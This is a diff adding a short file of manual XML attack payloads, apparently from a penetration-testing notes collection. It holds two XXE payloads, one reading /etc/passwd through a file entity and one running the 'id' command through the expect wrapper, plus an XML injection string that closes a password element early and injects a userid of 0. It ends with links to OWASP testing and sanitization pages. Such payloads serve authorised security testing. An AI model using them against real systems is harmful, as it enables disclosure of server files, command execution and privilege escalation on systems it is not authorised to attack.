@@ -1,0 +1,22 @@
+# manual payloads
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [  
+   <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+
+<?xml version="1.0" encoding="ISO-8859-1"?>
+ <!DOCTYPE foo [ <!ELEMENT foo ANY >
+   <!ENTITY xxe SYSTEM "expect://id" >]>
+    <creds>
+       <user>&xxe;</user>
+       <pass>mypass</pass>
+    </creds>
+
+# exemplary control of node construction
+# Username: tony
+# Password: Un6R34kb!e</password><!--
+# E-mail: --><userid>0</userid><mail>s4tan@hell.com
+#
+# more: https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)
+
+# sanitization: https://www.owasp.org/index.php/Injection_Prevention_Cheat_Sheet_in_Java#XML:_External_Entity_attack
